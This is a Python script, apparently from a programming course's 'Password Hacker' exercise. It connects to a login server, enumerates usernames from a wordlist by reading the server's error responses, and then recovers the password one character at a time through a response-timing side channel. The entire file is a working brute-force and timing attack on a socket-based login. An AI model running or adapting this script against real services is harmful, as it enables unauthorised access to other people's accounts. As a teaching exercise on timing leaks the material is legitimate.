import sys
import socket
import json
from datetime import datetime

def get_login(client_socket: socket):
    logins = set()
    with open("D:\!STUDY\Proga\Python\Password Hacker\logins.txt", "r") as file:
        for line in file:
            logins.add(line.strip())
    for login in logins:
        request = json.dumps({"login": login, "password": " "}).encode()
        client_socket.send(request)
        response = client_socket.recv(1024).decode()
        if response == json.dumps({"result": "Wrong password!"}):
            return login


def get_password(client_socket: socket, login: str):
    alph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    response = json.dumps({"result": "Wrong password!"})
    pass_ans = ""
    while True:
        for letter in alph:
            try:
                start = datetime.now()
                request = json.dumps({"login": login, "password": pass_ans + letter}).encode()
                client_socket.send(request)
                response = client_socket.recv(1024).decode()
                finish = datetime.now()
                difference = finish - start
                if difference.total_seconds() >= 0.1:
                    pass_ans += letter
                    break
                elif response == json.dumps({"result": "Connection success!"}):
                    return pass_ans + letter
            except (ConnectionAbortedError, ConnectionResetError):
                pass


def main():
    address = sys.argv[1], int(sys.argv[2])  # hostname, port

    with socket.socket() as client_socket:
        client_socket.connect(address)
        login = get_login(client_socket)
        password = get_password(client_socket, login)
        print(json.dumps({"login": login, "password": password}))


if __name__ == "__main__":
    main()